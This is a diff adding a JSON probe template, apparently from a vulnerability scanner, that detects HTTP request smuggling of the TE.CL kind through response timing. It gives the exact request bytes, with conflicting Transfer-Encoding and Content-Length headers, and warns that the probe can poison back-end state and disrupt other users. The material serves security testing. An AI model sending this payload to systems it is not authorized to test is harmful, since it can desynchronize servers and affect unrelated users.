@@ -1,0 +1,40 @@
+{
+  "name": "elite/Request smuggling TE.CL timing oracle",
+  "description": "[critical] Kettle's differential-timing TE.CL detection (PortSwigger Academy probe, exact bytes): Transfer-Encoding chunked front-end, Content-Length 6 back-end, body '0\\r\\nX' — chunked body terminates, dangling byte leaves the back-end waiting -> hang. Keywords: request smuggling desync te.cl timing reverse proxy. WARNING: if the target is actually CL.TE-vulnerable this probe poisons back-end state and may disrupt other users — run the CL.TE timing oracle FIRST. ctrl: benign fast POST fails the latency condition -> not falsified. base_url = site root; same slow-probe and curl-path caveats.",
+  "cwe": "CWE-444",
+  "requests": {
+    "baseline": {
+      "method": "POST",
+      "url": "{{base_url}}/",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "x=1"
+    },
+    "payload": {
+      "method": "POST",
+      "url": "{{base_url}}/",
+      "headers": {
+        "Transfer-Encoding": "chunked",
+        "Content-Length": "6"
+      },
+      "body": "0\r\nX"
+    }
+  },
+  "conditions": [
+    {
+      "type": "latency_delta",
+      "request_a": "baseline",
+      "request_b": "payload",
+      "min_delta": 4.0
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "ecf033148c8a",
+  "created": "2026-11-05T18:20:19.655790+00:00",
+  "last_used": "2026-11-05T18:20:19.655790+00:00"
+}
